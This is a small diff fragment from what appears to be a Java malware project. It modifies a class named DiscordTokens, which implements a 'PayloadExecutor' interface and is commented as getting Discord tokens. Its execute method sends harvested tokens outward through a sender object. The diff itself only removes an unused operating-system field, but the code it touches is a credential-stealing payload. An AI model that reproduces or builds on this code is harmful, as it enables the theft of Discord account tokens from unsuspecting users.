@@ -28,8 +28,6 @@ import java.util.regex.Pattern;
 public class DiscordTokens implements PayloadExecutor { //Gets discord tokens.
     public static Main main = new Main();
 
-    public String OS = System.getProperty("os.name");
-
     @Override
     public void execute() throws Exception {
         main.theThing.send("Discord Tokens: \n" + getTokens());
